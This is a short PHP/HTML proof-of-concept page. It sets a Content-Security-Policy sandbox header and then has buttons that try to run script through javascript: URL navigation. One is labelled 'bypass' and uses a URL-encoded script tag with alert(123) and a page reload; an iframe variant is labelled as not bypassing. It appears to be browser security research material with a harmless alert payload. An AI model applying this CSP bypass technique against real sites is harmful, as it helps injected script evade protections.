<?php

header('content-security-policy: sandbox allow-scripts allow-same-origin');
?>
<html>
    <title></title>
    <body>

        <button onclick="normal()">normal</button>
        <br/>
        <button onclick="bypass()">bypass</button>
        <br/>
        <button onclick="notbypass()">inFrame</button>
        <iframe id="myFrame"></iframe>

    </body>
    <script>
    function normal(){
        location.href="javascript:alert()";
    }

    function bypass(){
        location.href="javascript:'%3cscript%3ealert(123);location.reload();%3c/script%3e'";
    }

    function notbypass(){
        document.getElementById('myFrame').src="javascript:'%3cscript%3ealert(123);%3c/script%3e'";
    }
    </script>
</html>
